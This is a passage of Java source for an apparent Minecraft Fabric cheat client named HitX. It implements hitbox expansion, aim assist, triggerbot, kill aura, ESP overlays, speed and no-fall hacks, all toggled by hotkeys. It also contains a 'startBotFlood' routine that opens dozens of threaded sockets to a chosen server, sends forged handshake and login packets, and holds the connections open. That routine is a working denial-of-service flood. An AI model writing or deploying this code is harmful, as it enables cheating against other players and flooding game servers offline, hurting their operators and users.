package exloran.hitx;

import com.mojang.blaze3d.systems.RenderSystem;
import exloran.hitx.listener.OverlayReloadListener;
import me.shedaniel.autoconfig.AutoConfig;
import me.shedaniel.autoconfig.serializer.GsonConfigSerializer;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.rendering.v1.HudRenderCallback;
import net.fabricmc.fabric.api.client.screen.v1.ScreenEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.screen.ingame.InventoryScreen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.render.*;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.entity.Entity;
import net.minecraft.entity.LivingEntity;
import net.minecraft.entity.effect.StatusEffectInstance;
import net.minecraft.entity.effect.StatusEffects;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.math.Box;
import net.minecraft.util.math.MathHelper;
import net.minecraft.util.math.Vec3d;
import org.joml.Matrix4f;
import org.lwjgl.glfw.GLFW;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Random;

public class HitX implements ClientModInitializer {

    public static boolean hitBoxActive=false,triggerBotActive=false,aimAssistActive=false;
    public static boolean nightVisionActive=false,speedActive=false,sprintActive=false;
    public static boolean antiKbActive=false,espActive=false,noFallActive=false;
    public static boolean fullBrightActive=false,auraActive=false,elytraTargetActive=false;
    public static boolean botFloodActive=false;

    public static float auraRange=3.5f,auraSpeed=0.14f;
    public static boolean auraOnlyPlayers=false,auraAutoAttack=true;
    public static float elytraTargetRange=7.0f;
    public static float aimRange=4.5f,aimSpeed=0.08f,aimFov=90f;
    public static boolean aimAutoAttack=false,aimRecoil=false,aimElytra=true,aimOnlyPlayers=false;
    public static float aimRecoilStr=0.25f,aimElytraRange=6.0f;
    public static int triggerDelay=50;
    public static boolean triggerBlockOnShield=true,triggerBlockOnGap=true;
    public static boolean triggerBlockSelfShield=true,triggerBlockSelfGap=true;
    public static float speedMultiplier=1.35f,antiKbStrength=1.0f;
    public static boolean espPlayers=true,espMobs=false;
    public static int espColorR=255,espColorG=60,espColorB=60;
    public static int botCount=50;

    public static int keyHitbox=GLFW.GLFW_KEY_H,keyAimAssist=GLFW.GLFW_KEY_J;
    public static int keyTriggerBot=GLFW.GLFW_KEY_K,keyNightVision=GLFW.GLFW_KEY_N;
    public static int keySpeed=GLFW.GLFW_KEY_V,keyEsp=GLFW.GLFW_KEY_Z,keyAura=GLFW.GLFW_KEY_G;

    private boolean mLast=false,kHLast=false,kALast=false,kTLast=false;
    private boolean kNLast=false,kSLast=false,kELast=false,kGLast=false;
    private long lastAttack=0L,nvTick=0L,lastParticleTick=0L;
    private LivingEntity locked=null,auraLocked=null;

    private float smoothYaw=0f,smoothPitch=0f;
    private final float[]yawBuf=new float[6],pitchBuf=new float[6];
    private int bufIdx=0;
    private float auraYaw=0f,auraPitch=0f;
    private final float[]aYawBuf=new float[4],aPitchBuf=new float[4];
    private int aBufIdx=0;

    private final List<GlParticle> particles=new ArrayList<>();
    private final Random rng=new Random();

    // ── GL Particle ──────────────────────────────────────────
    private static class GlParticle {
        double x,y,z,vx,vy,vz;
        float r,g,b,a,size;
        int life,maxLife,type;
        GlParticle(double x,double y,double z,double vx,double vy,double vz,
                   float r,float g,float b,float size,int life,int type){
            this.x=x;this.y=y;this.z=z;this.vx=vx;this.vy=vy;this.vz=vz;
            this.r=r;this.g=g;this.b=b;this.a=1f;this.size=size;
            this.life=life;this.maxLife=life;this.type=type;
        }
        void tick(){x+=vx;y+=vy;z+=vz;vy-=0.003;life--;a=(float)life/maxLife;}
        boolean dead(){return life<=0;}
    }

    @Override
    public void onInitializeClient(){
        AutoConfig.register(HitXConfig.class,GsonConfigSerializer::new);
        ClientTickEvents.END_WORLD_TICK.register(w->OverlayReloadListener.callEvent());

        ScreenEvents.AFTER_INIT.register((client,screen,W,H)->{
            if(screen instanceof InventoryScreen inv){
                int id=inv.getScreenHandler().syncId;
                iconBtn(screen,new ItemStack(Items.DIAMOND_CHESTPLATE),"Zirhi Giy",W/2+92,H/2-50,22,22,
                    b->{for(int i=9;i<45;i++)if(isArmor(inv.getScreenHandler().getSlot(i).getStack()))
                        client.interactionManager.clickSlot(id,i,0,SlotActionType.QUICK_MOVE,client.player);});
            }
        });

        HudRenderCallback.EVENT.register((ctx,tick)->{
            MinecraftClient c=MinecraftClient.getInstance();
            if(c.player==null||c.world==null) return;
            if(c.getDebugHud().shouldShowDebugHud()) return;
            renderHUD(c,ctx);
            if(espActive) renderESP(c,ctx);
        });

        ClientTickEvents.END_CLIENT_TICK.register(client->{
            if(client.player==null||client.world==null) return;
            long handle=client.getWindow().getHandle();
            boolean mNow=GLFW.glfwGetKey(handle,GLFW.GLFW_KEY_M)==GLFW.GLFW_PRESS;
            if(mNow&&!mLast) client.setScreen(new HitXMenu());
            mLast=mNow;
            if(client.currentScreen==null){
                boolean kH=GLFW.glfwGetKey(handle,keyHitbox)==GLFW.GLFW_PRESS;
                boolean kA=GLFW.glfwGetKey(handle,keyAimAssist)==GLFW.GLFW_PRESS;
                boolean kT=GLFW.glfwGetKey(handle,keyTriggerBot)==GLFW.GLFW_PRESS;
                boolean kN=GLFW.glfwGetKey(handle,keyNightVision)==GLFW.GLFW_PRESS;
                boolean kS=GLFW.glfwGetKey(handle,keySpeed)==GLFW.GLFW_PRESS;
                boolean kE=GLFW.glfwGetKey(handle,keyEsp)==GLFW.GLFW_PRESS;
                boolean kG=GLFW.glfwGetKey(handle,keyAura)==GLFW.GLFW_PRESS;
                if(kH&&!kHLast) hitBoxActive=!hitBoxActive;
                if(kA&&!kALast){aimAssistActive=!aimAssistActive;locked=null;bar(client,aimAssistActive?"§aAimAssist Acik":"§cAimAssist Kapali");}
                if(kT&&!kTLast){triggerBotActive=!triggerBotActive;bar(client,triggerBotActive?"§aTriggerBot Acik":"§cTriggerBot Kapali");}
                if(kN&&!kNLast){nightVisionActive=!nightVisionActive;if(!nightVisionActive)client.player.removeStatusEffect(StatusEffects.NIGHT_VISION);}
                if(kS&&!kSLast){speedActive=!speedActive;bar(client,speedActive?"§aSpeed Acik":"§cSpeed Kapali");}
                if(kE&&!kELast){espActive=!espActive;bar(client,espActive?"§aESP Acik":"§cESP Kapali");}
                if(kG&&!kGLast){auraActive=!auraActive;auraLocked=null;bar(client,auraActive?"§aAura Acik":"§cAura Kapali");}
                kHLast=kH;kALast=kA;kTLast=kT;kNLast=kN;kSLast=kS;kELast=kE;kGLast=kG;
            }
            if(hitBoxActive){
                HitXConfig cfg=AutoConfig.getConfigHolder(HitXConfig.class).getConfig();
                for(Entity e:client.world.getEntities()){
                    if(e instanceof LivingEntity le&&le!=client.player){
                        float hw=(0.6f*cfg.xzExpand)/2f,ht=1.8f*cfg.yExpand;
                        le.setBoundingBox(new Box(le.getX()-hw,le.getY()+cfg.yOffset,le.getZ()-hw,le.getX()+hw,le.getY()+ht+cfg.yOffset,le.getZ()+hw));
                    }
                }
            }
            if(nightVisionActive){nvTick++;if(nvTick%4==0){StatusEffectInstance cur=client.player.getStatusEffect(StatusEffects.NIGHT_VISION);if(cur==null||cur.getDuration()<60)client.player.addStatusEffect(new StatusEffectInstance(StatusEffects.NIGHT_VISION,400,0,false,false));}}
            if(fullBrightActive){StatusEffectInstance nb=client.player.getStatusEffect(StatusEffects.NIGHT_VISION);if(nb==null||nb.getDuration()<60)client.player.addStatusEffect(new StatusEffectInstance(StatusEffects.NIGHT_VISION,400,0,false,false));}
            if(speedActive&&client.player.isOnGround()&&!client.player.isSneaking()){Vec3d vel=client.player.getVelocity();double h=Math.sqrt(vel.x*vel.x+vel.z*vel.z);if(h>0.01)client.player.setVelocity(vel.x*speedMultiplier,vel.y,vel.z*speedMultiplier);}
            if(sprintActive&&!client.player.isSneaking()&&!client.player.isTouchingWater()) client.player.setSprinting(true);
            if(noFallActive&&client.player.fallDistance>2.0f) client.player.fallDistance=0f;
            handleCombat(client);
            handleAura(client);
            tickParticles(client);
        });
    }

    // ── HUD ──────────────────────────────────────────────────
    private void renderHUD(MinecraftClient c,DrawContext ctx){
        if(c.options.hudHidden) return;
        int x=4,y=18;
        ctx.drawTextWithShadow(c.textRenderer,"§d§lHitX",x,y-10,0xFFCC66FF);
        hudLine(ctx,c,x,y,"Key Binds",true);y+=11;
        hudLine(ctx,c,x,y,"Offhand I",true);y+=11;
        hudLine(ctx,c,x,y,"Aura R",auraActive);y+=11;
        if(aimAssistActive){hudLine(ctx,c,x,y,"AimAssist",true);y+=11;}
        if(espActive){hudLine(ctx,c,x,y,"ESP",true);y+=11;}
        if(triggerBotActive){hudLine(ctx,c,x,y,"TriggerBot",true);y+=11;}
        if(speedActive){hudLine(ctx,c,x,y,"Speed",true);y+=11;}
        if(elytraTargetActive){hudLine(ctx,c,x,y,"ElytraTarget",true);y+=11;}
        if(botFloodActive){hudLine(ctx,c,x,y,"BotFlood",true);y+=11;}
        LivingEntity t=auraLocked!=null?auraLocked:locked;
        if(t!=null&&t.isAlive()) ctx.drawTextWithShadow(c.textRenderer,"§7> §f"+t.getName().getString()+"  §c"+(int)t.getHealth()+"❤",x,y+3,0xFFFFFFFF);
    }
    private void hudLine(DrawContext ctx,MinecraftClient c,int x,int y,String name,boolean on){
        ctx.fill(x,y,x+1,y+9,on?0xFF00CCFF:0xFF333344);
        ctx.drawTextWithShadow(c.textRenderer,name,x+4,y,on?0xFFAAEEFF:0xFF666677);
    }

    // ── ESP ──────────────────────────────────────────────────
    private void renderESP(MinecraftClient client,DrawContext ctx){
        int sw=client.getWindow().getScaledWidth(),sh=client.getWindow().getScaledHeight();
        Vec3d cam=client.gameRenderer.getCamera().getPos();
        double px=cam.x,py=cam.y,pz=cam.z;
        float yawRad=(float)Math.toRadians(client.gameRenderer.getCamera().getYaw()+180f);
        float pitchRad=(float)Math.toRadians(client.gameRenderer.getCamera().getPitch());
        double sinY=Math.sin(yawRad),cosY=Math.cos(yawRad);
        double sinP=Math.sin(pitchRad),cosP=Math.cos(pitchRad);
        double fov=Math.toRadians(client.options.getFov().getValue());
        double fovF=(sw*0.5)/Math.tan(fov*0.5);
        for(Entity e:client.world.getEntities()){
            if(e==client.player||!e.isAlive()) continue;
            boolean isP=e instanceof PlayerEntity,isM=e instanceof LivingEntity&&!isP;
            if(isP&&!espPlayers) continue;
            if(isM&&!espMobs) continue;
            Box box=e.getBoundingBox().expand(0.05);
            double[]cxA={box.minX,box.maxX,box.minX,box.maxX,box.minX,box.maxX,box.minX,box.maxX};
            double[]cyA={box.minY,box.minY,box.maxY,box.maxY,box.minY,box.minY,box.maxY,box.maxY};
            double[]czA={box.minZ,box.minZ,box.minZ,box.minZ,box.maxZ,box.maxZ,box.maxZ,box.maxZ};
            double mnX=1e9,mnY=1e9,mxX=-1e9,mxY=-1e9;boolean vis=false;
            for(int i=0;i<8;i++){
                double rx=cxA[i]-px,ry=cyA[i]-py,rz=czA[i]-pz;
                double x1=rx*cosY-rz*sinY,z2=rx*sinY+rz*cosY;
                double y1=ry*cosP-z2*sinP,z1=ry*sinP+z2*cosP;
                if(z1<0.1) continue;
                double sx2=sw*0.5+(x1/z1)*fovF,sy2=sh*0.5-(y1/z1)*fovF;
                if(sx2<-sw||sx2>sw*2||sy2<-sh||sy2>sh*2) continue;
                vis=true;
                if(sx2<mnX)mnX=sx2;if(sy2<mnY)mnY=sy2;if(sx2>mxX)mxX=sx2;if(sy2>mxY)mxY=sy2;
            }
            if(!vis) continue;
            if(mxX-mnX<4){double m=(mnX+mxX)/2;mnX=m-2;mxX=m+2;}
            if(mxY-mnY<4){double m=(mnY+mxY)/2;mnY=m-2;mxY=m+2;}
            int ex=(int)mnX,ey=(int)mnY,ew=(int)(mxX-mnX),eh=(int)(mxY-mnY);
            boolean isTgt=(auraLocked==e||locked==e);
            int col=isP?(0xFF000000|(espColorR<<16)|(espColorG<<8)|espColorB):0xFF44FF44;
            drawESPCorners(ctx.getMatrices(),ex,ey,ew,eh,col,isTgt);
            if(e instanceof LivingEntity le){
                String lbl=le.getName().getString()+"  §c"+(int)le.getHealth()+"❤  §7"+(int)client.player.distanceTo(e)+"m";
                ctx.drawTextWithShadow(client.textRenderer,lbl,ex+ew/2-client.textRenderer.getWidth(lbl)/2,ey-10,col);
            }
        }
    }

    private void drawESPCorners(MatrixStack ms,int x,int y,int w,int h,int color,boolean hi){
        int cL=Math.min(w,h)/4+3;
        float a=hi?1.0f:0.85f,r=((color>>16)&0xFF)/255f,g=((color>>8)&0xFF)/255f,b=(color&0xFF)/255f;
        RenderSystem.enableBlend();RenderSystem.defaultBlendFunc();
        RenderSystem.setShader(GameRenderer::getPositionColorProgram);
        RenderSystem.lineWidth(hi?2.0f:1.5f);
        Matrix4f m4=ms.peek().getPositionMatrix();
        Tessellator t=Tessellator.getInstance();
        BufferBuilder buf=t.begin(VertexFormat.DrawMode.DEBUG_LINES,VertexFormats.POSITION_COLOR);
        buf.vertex(m4,x,y,0).color(r,g,b,a);buf.vertex(m4,x+cL,y,0).color(r,g,b,a);
        buf.vertex(m4,x,y,0).color(r,g,b,a);buf.vertex(m4,x,y+cL,0).color(r,g,b,a);
        buf.vertex(m4,x+w,y,0).color(r,g,b,a);buf.vertex(m4,x+w-cL,y,0).color(r,g,b,a);
        buf.vertex(m4,x+w,y,0).color(r,g,b,a);buf.vertex(m4,x+w,y+cL,0).color(r,g,b,a);
        buf.vertex(m4,x,y+h,0).color(r,g,b,a);buf.vertex(m4,x+cL,y+h,0).color(r,g,b,a);
        buf.vertex(m4,x,y+h,0).color(r,g,b,a);buf.vertex(m4,x,y+h-cL,0).color(r,g,b,a);
        buf.vertex(m4,x+w,y+h,0).color(r,g,b,a);buf.vertex(m4,x+w-cL,y+h,0).color(r,g,b,a);
        buf.vertex(m4,x+w,y+h,0).color(r,g,b,a);buf.vertex(m4,x+w,y+h-cL,0).color(r,g,b,a);
        if(hi){int mx2=x+w/2,my2=y+h/2;
            buf.vertex(m4,mx2-4,my2,0).color(r,g,b,0.9f);buf.vertex(m4,mx2+4,my2,0).color(r,g,b,0.9f);
            buf.vertex(m4,mx2,my2-4,0).color(r,g,b,0.9f);buf.vertex(m4,mx2,my2+4,0).color(r,g,b,0.9f);}
        BufferRenderer.drawWithGlobalProgram(buf.end());
        RenderSystem.disableBlend();
    }

    // ── Combat ───────────────────────────────────────────────
    private void handleCombat(MinecraftClient client){
        if(locked!=null&&(!locked.isAlive()||client.player.distanceTo(locked)>aimRange+2.5f)) locked=null;
        if(aimAssistActive&&locked==null){
            float maxD=(aimElytra&&client.player.isFallFlying())?aimElytraRange:aimRange;
            double best=Double.MAX_VALUE;
            for(Entity e:client.world.getEntities()){
                if(!(e instanceof LivingEntity le)) continue;
                if(le==client.player||!le.isAlive()) continue;
                if(aimOnlyPlayers&&!(le instanceof PlayerEntity)) continue;
                double d=client.player.distanceTo(le);if(d>maxD) continue;
                float ang=angleTo(client,le);if(ang>aimFov) continue;
                double sc=ang*0.6+d*0.4;if(sc<best){best=sc;locked=le;}
            }
        }
        if(aimAssistActive&&locked!=null) smoothAim(client,locked,false);
        LivingEntity trig=null;
        if(triggerBotActive&&client.crosshairTarget instanceof net.minecraft.util.hit.EntityHitResult hit&&hit.getEntity() instanceof LivingEntity le&&le.isAlive()) trig=le;
        LivingEntity atk=trig!=null?trig:(aimAutoAttack&&locked!=null?locked:null);
        if(atk==null) return;
        if(triggerBlockOnShield&&atk.isBlocking()) return;
        if(triggerBlockOnGap&&isEating(atk)) return;
        if(triggerBlockSelfShield&&client.player.isBlocking()) return;
        if(triggerBlockSelfGap&&isEating(client.player)) return;
        if(client.player.getAttackCooldownProgress(0.5f)<1.0f) return;
        long now=System.currentTimeMillis();if(now-lastAttack<triggerDelay) return;
        client.interactionManager.attackEntity(client.player,atk);
        client.player.swingHand(Hand.MAIN_HAND);lastAttack=now;
        if(aimRecoil) client.player.setPitch(client.player.getPitch()-aimRecoilStr);
    }

    // ── Aura ─────────────────────────────────────────────────
    private void handleAura(MinecraftClient client){
        boolean em=elytraTargetActive&&client.player.isFallFlying();
        if(!auraActive&&!em){auraLocked=null;return;}
        float range=em?elytraTargetRange:auraRange;
        if(auraLocked!=null&&(!auraLocked.isAlive()||client.player.distanceTo(auraLocked)>range+1.5f)) auraLocked=null;
        if(auraLocked==null){
            double best=Double.MAX_VALUE;
            for(Entity e:client.world.getEntities()){
                if(!(e instanceof LivingEntity le)) continue;
                if(le==client.player||!le.isAlive()) continue;
                if(auraOnlyPlayers&&!(le instanceof PlayerEntity)) continue;
                double d=client.player.distanceTo(le);if(d>range) continue;
                float ang=angleTo(client,le);
                double sc=ang*0.45+d*0.55;if(sc<best){best=sc;auraLocked=le;}
            }
        }
        if(auraLocked==null) return;
        smoothAim(client,auraLocked,true);
        if(!auraAutoAttack) return;
        if(triggerBlockOnShield&&auraLocked.isBlocking()) return;
        if(triggerBlockOnGap&&isEating(auraLocked)) return;
        if(triggerBlockSelfShield&&client.player.isBlocking()) return;
        if(triggerBlockSelfGap&&isEating(client.player)) return;
        if(client.player.getAttackCooldownProgress(0.5f)>=1.0f){
            long now=System.currentTimeMillis();
            if(now-lastAttack>=triggerDelay){client.interactionManager.attackEntity(client.player,auraLocked);client.player.swingHand(Hand.MAIN_HAND);lastAttack=now;}
        }
    }

    // ── Smooth Aim ───────────────────────────────────────────
    private void smoothAim(MinecraftClient client,LivingEntity target,boolean isAura){
        double vx=target.getX()-target.prevX,vy=target.getY()-target.prevY,vz=target.getZ()-target.prevZ;
        double lead=isAura?1.8:2.2;
        double tx=target.getX()+vx*lead,tz=target.getZ()+vz*lead;
        double ty=target.getY()+vy*0.25+target.getEyeHeight(target.getPose())*(isAura?0.72:0.82);
        double dx=tx-client.player.getX(),dz=tz-client.player.getZ();
        double dy=ty-(client.player.getY()+client.player.getEyeHeight(client.player.getPose()));
        double hD=Math.sqrt(dx*dx+dz*dz);
        float tY=MathHelper.wrapDegrees((float)Math.toDegrees(Math.atan2(dz,dx))-90f);
        float tP=(float)-Math.toDegrees(Math.atan2(dy,hD));
        float dY=MathHelper.wrapDegrees(tY-client.player.getYaw());
        float dP=MathHelper.wrapDegrees(tP-client.player.getPitch());
        float dist=client.player.distanceTo(target),ang=angleTo(client,target);
        float spd=isAura?auraSpeed:aimSpeed;
        float dF=MathHelper.clamp(dist/(isAura?auraRange:aimRange),0.2f,1f);
        float aF=MathHelper.clamp(ang/12f,0.1f,1f);
        float dynSpd=spd*dF*aF;
        double sens=client.options.getMouseSensitivity().getValue();
        double gcd=Math.pow(sens*0.6+0.2,3.0)*8.0*0.15;if(gcd<0.001)gcd=0.001;
        if(isAura){
            auraYaw+=(dY-auraYaw)*dynSpd*3f;auraPitch+=(dP-auraPitch)*dynSpd*3f;
            aYawBuf[aBufIdx]=auraYaw;aPitchBuf[aBufIdx]=auraPitch;aBufIdx=(aBufIdx+1)%4;
            float ay=0f,ap=0f;for(int i=0;i<4;i++){ay+=aYawBuf[i];ap+=aPitchBuf[i];}ay/=4f;ap/=4f;
            client.player.setYaw(client.player.getYaw()+(float)(Math.round(ay/gcd)*gcd));
            client.player.setPitch(MathHelper.clamp(client.player.getPitch()+(float)(Math.round(ap/gcd)*gcd),-90f,90f));
        } else {
            smoothYaw+=(dY-smoothYaw)*dynSpd*2.5f;smoothPitch+=(dP-smoothPitch)*dynSpd*2.5f;
            yawBuf[bufIdx]=smoothYaw;pitchBuf[bufIdx]=smoothPitch;bufIdx=(bufIdx+1)%6;
            float ay=0f,ap=0f;for(int i=0;i<6;i++){ay+=yawBuf[i];ap+=pitchBuf[i];}ay/=6f;ap/=6f;
            client.player.setYaw(client.player.getYaw()+(float)(Math.round(ay/gcd)*gcd));
            client.player.setPitch(MathHelper.clamp(client.player.getPitch()+(float)(Math.round(ap/gcd)*gcd),-90f,90f));
        }
    }

    // ── Particles ────────────────────────────────────────────
    private void tickParticles(MinecraftClient c){
        Iterator<GlParticle> it=particles.iterator();
        while(it.hasNext()){GlParticle p=it.next();p.tick();if(p.dead())it.remove();}
        long now=System.currentTimeMillis();
        if(now-lastParticleTick<55) return;
        lastParticleTick=now;
        if(c.player==null||c.world==null) return;
        double px=c.player.getX(),py=c.player.getY(),pz=c.player.getZ();
        for(int i=0;i<4;i++){
            double ox=(rng.nextDouble()-0.5)*5,oy=rng.nextDouble()*3.5,oz=(rng.nextDouble()-0.5)*5;
            particles.add(new GlParticle(px+ox,py+oy,pz+oz,(rng.nextDouble()-0.5)*0.06,rng.nextDouble()*0.08+0.03,(rng.nextDouble()-0.5)*0.06,1f,0.85f+rng.nextFloat()*0.15f,0f,1.5f+rng.nextFloat()*1.5f,20+rng.nextInt(15),0));
        }
        for(int i=0;i<3;i++){
            double ox=(rng.nextDouble()-0.5)*6,oy=rng.nextDouble()*4,oz=(rng.nextDouble()-0.5)*6;
            particles.add(new GlParticle(px+ox,py+oy,pz+oz,(rng.nextDouble()-0.5)*0.05,rng.nextDouble()*0.07,(rng.nextDouble()-0.5)*0.05,0f,0.7f+rng.nextFloat()*0.3f,1f,1f+rng.nextFloat(),18+rng.nextInt(12),1));
        }
        if(auraActive&&auraLocked!=null&&auraLocked.isAlive()){
            double tx=auraLocked.getX(),ty=auraLocked.getY()+1.0,tz=auraLocked.getZ();
            double angle=now*0.004;
            for(int i=0;i<3;i++){double a=angle+i*(Math.PI*2/3);double r=0.7;
                particles.add(new GlParticle(tx+Math.cos(a)*r,ty+Math.sin(now*0.002)*0.3,tz+Math.sin(a)*r,0,0.01,0,1f,0.3f,1f,2f,12,2));}
            particles.add(new GlParticle(tx,ty+1.5,tz,(rng.nextDouble()-0.5)*0.03,0.04,(rng.nextDouble()-0.5)*0.03,0.4f,0.8f,1f,1.5f,15,1));
        }
    }

    // ── Bot Flood ────────────────────────────────────────────
    public void startBotFlood(String serverIp,int port,int count){
        botFloodActive=true;
        for(int i=0;i<count;i++){
            final int idx=i;
            Thread th=new Thread(()->{
                try{
                    String name="Bot_"+idx+"_"+Integer.toHexString(rng.nextInt(0xFFFF));
                    java.net.Socket sock=new java.net.Socket(serverIp,port);
                    java.io.OutputStream out=sock.getOutputStream();
                    sendVarIntPacket(out,buildHandshake(serverIp,port,767,2));
                    sendVarIntPacket(out,buildLoginStart(name));
                    Thread.sleep(500+rng.nextInt(300));
                    long last=System.currentTimeMillis();
                    while(botFloodActive&&sock.isConnected()){
                        if(System.currentTimeMillis()-last>5000){sendVarIntPacket(out,new byte[]{0x12,0,0,0,0,0,0,0,0});last=System.currentTimeMillis();}
                        Thread.sleep(100);
                    }
                    sock.close();
                }catch(Exception ignored){}
            },"HitX-Bot-"+idx);
            th.setDaemon(true);
            try{Thread.sleep(15);}catch(Exception ignored){}
            th.start();
        }
    }
    private byte[] buildHandshake(String host,int port,int protocol,int nextState){
        try{java.io.ByteArrayOutputStream b=new java.io.ByteArrayOutputStream();writeVarInt(b,0x00);writeVarInt(b,protocol);writeString(b,host);b.write((port>>8)&0xFF);b.write(port&0xFF);writeVarInt(b,nextState);return b.toByteArray();}catch(Exception e){return new byte[0];}
    }
    private byte[] buildLoginStart(String name){
        try{java.io.ByteArrayOutputStream b=new java.io.ByteArrayOutputStream();writeVarInt(b,0x00);writeString(b,name);b.write(0x00);return b.toByteArray();}catch(Exception e){return new byte[0];}
    }
    private void sendVarIntPacket(java.io.OutputStream out,byte[]data) throws Exception{java.io.ByteArrayOutputStream len=new java.io.ByteArrayOutputStream();writeVarInt(len,data.length);out.write(len.toByteArray());out.write(data);out.flush();}
    private void writeVarInt(java.io.OutputStream out,int v) throws Exception{while((v&~0x7F)!=0){out.write((v&0x7F)|0x80);v>>>=7;}out.write(v);}
    private void writeString(java.io.OutputStream out,String s) throws Exception{byte[]b=s.getBytes(java.nio.charset.StandardCharsets.UTF_8);writeVarInt(out,b.length);out.write(b);}

    // ── Rounded Rect ─────────────────────────────────────────
    public static void drawRoundedRect(MatrixStack ms,float x,float y,float w,float h,float r,int color){
        float a=((color>>24)&0xFF)/255f,rv=((color>>16)&0xFF)/255f,g=((color>>8)&0xFF)/255f,b=(color&0xFF)/255f;
        if(a<=0f) return;
        r=Math.min(r,Math.min(w,h)*0.499f);
        RenderSystem.enableBlend();RenderSystem.defaultBlendFunc();RenderSystem.setShader(GameRenderer::getPositionColorProgram);
        Matrix4f m4=ms.peek().getPositionMatrix();Tessellator tess=Tessellator.getInstance();int segs=12;
        BufferBuilder buf=tess.begin(VertexFormat.DrawMode.TRIANGLE_FAN,VertexFormats.POSITION_COLOR);
        buf.vertex(m4,x+w/2f,y+h/2f,0f).color(rv,g,b,a);
        float[]cxA={x+w-r,x+r,x+r,x+w-r},cyA={y+r,y+r,y+h-r,y+h-r},stA={270f,180f,90f,0f};
        for(int i=0;i<4;i++) for(int j=0;j<=segs;j++){double ang=Math.toRadians(stA[i]+j*90.0/segs);buf.vertex(m4,(float)(cxA[i]+Math.cos(ang)*r),(float)(cyA[i]+Math.sin(ang)*r),0f).color(rv,g,b,a);}
        double ca=Math.toRadians(stA[0]);buf.vertex(m4,(float)(cxA[0]+Math.cos(ca)*r),(float)(cyA[0]+Math.sin(ca)*r),0f).color(rv,g,b,a);
        BufferRenderer.drawWithGlobalProgram(buf.end());RenderSystem.disableBlend();
    }
    public static void drawRoundedOutline(MatrixStack ms,float x,float y,float w,float h,float r,int color){
        float a=((color>>24)&0xFF)/255f,rv=((color>>16)&0xFF)/255f,g=((color>>8)&0xFF)/255f,b=(color&0xFF)/255f;
        if(a<=0f) return;
        r=Math.min(r,Math.min(w,h)*0.499f);
        RenderSystem.enableBlend();RenderSystem.defaultBlendFunc();RenderSystem.setShader(GameRenderer::getPositionColorProgram);RenderSystem.lineWidth(1.5f);
        Matrix4f m4=ms.peek().getPositionMatrix();Tessellator tess=Tessellator.getInstance();int segs=12;
        BufferBuilder buf=tess.begin(VertexFormat.DrawMode.DEBUG_LINE_STRIP,VertexFormats.POSITION_COLOR);
        float[]cxA={x+w-r,x+r,x+r,x+w-r},cyA={y+r,y+r,y+h-r,y+h-r},stA={270f,180f,90f,0f};
        for(int i=0;i<4;i++) for(int j=0;j<=segs;j++){double ang=Math.toRadians(stA[i]+j*90.0/segs);buf.vertex(m4,(float)(cxA[i]+Math.cos(ang)*r),(float)(cyA[i]+Math.sin(ang)*r),0f).color(rv,g,b,a);}
        double ca=Math.toRadians(stA[0]);buf.vertex(m4,(float)(cxA[0]+Math.cos(ca)*r),(float)(cyA[0]+Math.sin(ca)*r),0f).color(rv,g,b,a);
        BufferRenderer.drawWithGlobalProgram(buf.end());RenderSystem.disableBlend();
    }

    // ── MENÜ — CatLean 4 sütun tarzı ────────────────────────
    public class HitXMenu extends Screen {
        private static final int MW=740,MH=400;
        private float animT=0f;
        private int bind=-1;
        protected HitXMenu(){super(Text.literal("HitX"));}
        @Override public void tick(){super.tick();animT+=0.04f;}

        @Override
        public void render(DrawContext ctx,int mx,int my,float delta){
            HitXConfig cfg=AutoConfig.getConfigHolder(HitXConfig.class).getConfig();
            MatrixStack ms=ctx.getMatrices();
            int ox=ox(),oy=oy();
            ctx.fill(0,0,width,height,0x88000000);
            drawRoundedRect(ms,ox,oy,MW,MH,6f,0xF0101014);
            drawRoundedOutline(ms,ox,oy,MW,MH,6f,0xFF2A0055);
            drawRoundedRect(ms,ox,oy,MW,24,6f,0xFF160028);
            ctx.fill(ox,oy+12,ox+MW,oy+24,0xFF160028);
            float p=(float)(Math.sin(animT)*0.5+0.5);
            int tc=0xFF000000|(((int)(160+p*95))<<16)|(((int)(p*15))<<8)|((int)(200+p*55));
            ctx.drawCenteredTextWithShadow(textRenderer,"§lHITX  §8·  §7v2.1",ox+MW/2,oy+8,tc);
            String[]topTabs={"Ui","Windows","Hud","Theme","Search"};
            int ttx=ox+MW/2-topTabs.length*38;
            for(String t:topTabs){boolean hov=hov(mx,my,ttx,oy+1,72,18);drawRoundedRect(ms,ttx+1,oy+2,70,16,4f,hov?0xFF2A004A:0xFF1A001E);ctx.drawCenteredTextWithShadow(textRenderer,t,ttx+36,oy+7,hov?0xFFCC99FF:0xFF666677);ttx+=74;}
            int colW=(MW-8)/4;
            renderCol(ctx,ms,mx,my,ox+2,oy+24,"Pvp",new String[]{"Attack","Legit","Protect"},getPvpMods(),0);
            renderCol(ctx,ms,mx,my,ox+2+colW,oy+24,"Movement",new String[]{"Basic","Rage"},getMovMods(),1);
            renderCol(ctx,ms,mx,my,ox+2+colW*2,oy+24,"Visual",new String[]{"Cosmetic","Esp"},getVisMods(),2);
            renderCol(ctx,ms,mx,my,ox+2+colW*3,oy+24,"Utility",new String[]{"World","Equip","Player","Misc"},getUtilMods(),3);
            drawRoundedRect(ms,ox+MW-90,oy+MH-60,86,56,5f,0xFF111118);
            drawRoundedOutline(ms,ox+MW-90,oy+MH-60,86,56,5f,0xFF333344);
            ctx.drawTextWithShadow(textRenderer,"§7Theme Editor",ox+MW-84,oy+MH-56,0xFF888899);
            drawRoundedRect(ms,ox+MW-88,oy+MH-44,82,14,3f,0xFF220033);
            ctx.drawCenteredTextWithShadow(textRenderer,"§dCatLean",ox+MW-47,oy+MH-42,0xFFDD88FF);
            drawRoundedRect(ms,ox+MW-88,oy+MH-28,82,14,3f,0xFF1A001A);
            ctx.drawCenteredTextWithShadow(textRenderer,"§bStyleNew",ox+MW-47,oy+MH-26,0xFF88DDFF);
            super.render(ctx,mx,my,delta);
        }

